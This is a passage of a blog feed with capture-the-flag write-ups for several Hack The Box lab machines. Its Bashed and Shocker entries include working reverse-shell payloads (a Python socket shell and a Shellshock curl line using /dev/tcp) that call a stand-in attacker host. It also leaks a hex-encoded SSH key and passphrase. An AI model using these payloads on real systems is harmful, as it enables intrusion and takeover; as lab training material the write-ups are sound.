((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).443/tcp open ssl/https Apache/2.2.22 (Ubuntu)|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US| Not valid before: 2018-02-06T00:45:25|_Not valid after: 2019-02-06T00:45:25|_ssl-date: 2020-12-04T13:49:33+00:00; +1m05s from scanner time.Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: 1m04sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 121.30 secondswe got ssh, HTTP, and HTTPS services on the box. Let’s further enumerate with HTTP.HTTP and HTTPS both show the same image as the homepage.homepage is a hint for heartbleed vulnerability. Let’s fire Metasploit and exploit this vulnerability.we use auxiliary/scanner/ssl/openssl_heartbleed module to exploit heartbleed vulnerability.this leaked some base64 strings in memory.$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== after decoding it we get:heartbleedbelievethehype. it seems to be a password. add it in our notes and enumerate furthermore.after running ffuf for a brute-forcing directory we found some interesting listing.in /dev directory we got two files. hype_key and notes.txt.Gaining shellhype_key content some data in decimal format.2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2dafter decoding it we got ssh key for hype.we got hype’s ssh key. but it’s encrypted. and a notes.txt have a to-do list.I tried heartbleedbelievethehype as a passphrase for ssh key and we login into hypes ssh account.Getting rootdownload linpeas and run the script. the script shows that root has tmux session with /.devs sockets. permissions of /.devs .hype@Valentine:~/Desktop$ ls -la /.devs/dev_sesssrw-rw---- 1 root hype 0 Dec 4 22:45 /.devs/dev_sessallows our group to rw in order to hijack the root shell.we just attach the tmux session to get the root shell.tmux -S /.devs/dev_sessand we get a root shell." }, { "title": "Nibbles", "url": "/posts/Nibbles/", "categories": "CTF, hackthebox", "tags": "file upload, permission", "date": "2020-11-30 22:30:00 +0530", "snippet": "Nibble is an easy box that uses the default credential for the admin account. also, this version is (4.0.3) is vulnerable to an arbitrary file upload to gain user shell. for privs escalation we use misconfigured permission script.Enumerationas always we start with a Nmap scan.Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-01 11:26 ESTNmap scan report for 10.10.10.75Host is up (0.19s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.65 secondswe found two open ports. ssh and webpage hosted on the machine.Let’s enumerate the webpage first. by viewing source code we found a directory named nibble.after fuzzing for the directory we found some entries. it has an admin login page at admin.php.Gaining Shellin nibbleblog/content/private/users.xml we found username admintried creds admin and nibbles get into the admin dashboard.Let’s quick search for nibble blog exploits. It shows two exploits.By arbitrary file upload exploit with the above creds we got a user shell.Getting Rootin-home directory there is file personal.zip unzip that file. it has the script monitor.sh which has 777 permission. that means we can use that script to get root access.there is also an outdated kernel version which is vulnerable to a kernel exploit but I didn’t try it." }, { "title": "Blocky", "url": "/posts/blocky/", "categories": "CTF, hackthebox", "tags": "jar, sudo", "date": "2020-11-29 22:43:43 +0530", "snippet": "Blocky is an easy box that involves a jar file to get user shell and sudo for privs escalation.EnumerationAs always we start enumeration with Nmap.Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-29 07:25 ESTNmap scan report for 10.10.10.37Host is up (0.43s latency).PORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.5a22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)| 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)|_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-generator: WordPress 4.8|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: BlockyCraft &amp;amp;#8211; Under Construction!8192/tcp closed sophos25565/tcp open minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.42 secondsWe have FTP, a webpage, and a Minecraft server to test. I always start with FTP. Search a little bit about the version but doesn’t find any exploit or vulnerability for this version. so let’s move to webpage.WordPress is used for a webpage. put wpscan in the background and enumerate other things.in wpscan we find username notch. add it in our notes and enumerate furthermore.Let’s find out what directories are available on the webpage.Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://10.10.10.37[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Extensions: php[+] Timeout: 10s===============================================================2020/11/29 08:24:15 Starting gobuster===============================================================/index.php (Status: 301)/wiki (Status: 301)/wp-content (Status: 301)/wp-login.php (Status: 200)/plugins (Status: 301)/wp-includes (Status: 301)/javascript (Status: 301)/wp-trackback.php (Status: 200)/wp-admin (Status: 301)in plugins directory there are two jar file.Download both files and unzip them. in BlockyCore.jar found BlockyCore.class lets decompile it. i doesn’t have jad on my machines so I use online decompiler and decompile BlockyCor.jar file.After decompiling file, we got the sql database password for the root user.tried to ssh on the box using password and user notch. login into ssh.Getting rootby typing sudo -l it shows that we can run All cmd as root. so to get root shell just run sudo su and got root access." }, { "title": "Bashed", "url": "/posts/bashed/", "categories": "CTF, hackthebox", "tags": "phpbash, sudo, kernel", "date": "2020-11-28 21:30:30 +0530", "snippet": "bashed is easy boxEnumerationAs always we start with Nmap.Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 10:34 CET Nmap scan report for 10.10.10.68 Host is up (0.073s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexels Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.27 secondson the webpage, nothing interesting was found. next we find out directories using ffuf/dev looks interesting let’s check out thatwhen we navigate to phpbash.php we get shell.Gaining Shellwe use python to get reverse shell.python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ATTACKING-IP&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;we get shell as www-data.on this box we have two user scriptmanager and arrexel,in arrexel home directory we found user flagGaining Rootwe can run everything as scriptmanager using sudo. so lets first escalate privs to scriptmanager.When we run uname with -a flag we see that machine is running outdate kernel version 4.4after bit google search we found kernel exploit for this version. but gcc in not installed on box so we have to compile this on our machine and then transfer it to victim." }, { "title": "Shoker", "url": "/posts/Shoker/", "categories": "CTF, hackthebox", "tags": "sudo, shellshock", "date": "2020-11-28 07:10:10 +0530", "snippet": "EnumerationShoker is an easy box and by the name, we can guess that it has shellshock vulnerability. which allow attacker to remotely execute code on system. its found in unix bash shell so it can be found every linux unix system. and for privs we can use sudo.as always we start with Nmap scan.Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 10:28 ESTNmap scan report for 10.10.10.56Host is up (0.39s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)25000/tcp closed icl-twobase1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.37 secondsWe have port 80 open so lets check webpage first.nothing interested here. lets find out direcotories for webpage by using ffuf.we got cgi-bin and when we recursivelly scan /cgi-bin for .bin,.sh,cgi extentions, we got user.sh.Gaining ShellWe have to craft payload to gain shell on the box.curl -A “() { :; }; /bin/bash -i &amp;gt; /dev/tcp/attacker_ip/port 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1” http://10.10.10.56/cgi-bin/user.sh/bin/bash -i : defind that shell must be interactive.&amp;gt; /dev/tcp/attacker_ip/port : this will redirect the output of the shell to attacker via tcp connection.0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1 : its basically indicates that input coming from a TCP connection, and output going to the same TCP connection.by this payload we can get shell on the box.Getting Rootits easy to escalate privs in this box we can run perl as root.sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39;" }, { "title": "Mirai", "url": "/posts/Mirai/", "categories": "CTF, hackthebox", "tags": "forensic, sudo", "date": "2020-11-27 19:30:12 +0530", "snippet": "Mirai is the easy box which have default creds to gain shell access and the sudo for root access, althrought it has some forensic challenge to find root flag.EnumerationAs always we start with nmap scan.Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 07:51 ESTNmap scan report for 10.10.10.48Host is up (0.43s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)| ssh-hostkey: | 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)| 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)| 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)|_ 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)53/tcp open domain dnsmasq 2.76| dns-nsid: |_ bind.version: dnsmasq-2.7680/tcp open http lighttpd 1.4.35|_http-server-header: lighttpd/1.4.35|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).1285/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)32400/tcp open http Plex Media Server httpd| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Server returned status 401 but no WWW-Authenticate header.|_http-cors: HEAD GET POST PUT DELETE OPTIONS|_http-title: UnauthorizedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.67 secondslooking to nmap scan we see that there is some port open my first aproach is enumerate web service for more information gathering so head on port 80.i checked website but it does not return anything. so i fired up burp and inspect request in burp.after inspecting the response of request i find out that it host pi-hole which is used to block ad.next step is find out if any directories. i used ffuf to fuzz directories.fuzz for directories got /admin directory which host admin panel for pi-holesearched for default cred on google. try this cred on admin panel log in page but it does not work.Gaining Shellafter checking the GitHub repository I found out that pi-hole used a random password while setup so I cant use to login on admin panel. although I tried it on ssh and it works. get initial access to the system using ssh.Getting Rootif I know the user password first thing I check if the user can run sudo. using sudo we can run all cmd as root on the machine. get root shell using sudo -ito get root flag we need some forensic knowledge which i have zero experience with. when we cat root.txt it show I lost my original root.txt! I think I may have a backup on my USB stick...so it has USB mounted on the machine. mount to show mounted device it show that /dev/sdb on /media/usbstick.check /media/usbstick it has damit.txt file which is a note from James.he deleted our root.txt . now we have to recover it.i don’t have experience with forensic so we just use simple strings on to get root.txt." } ]
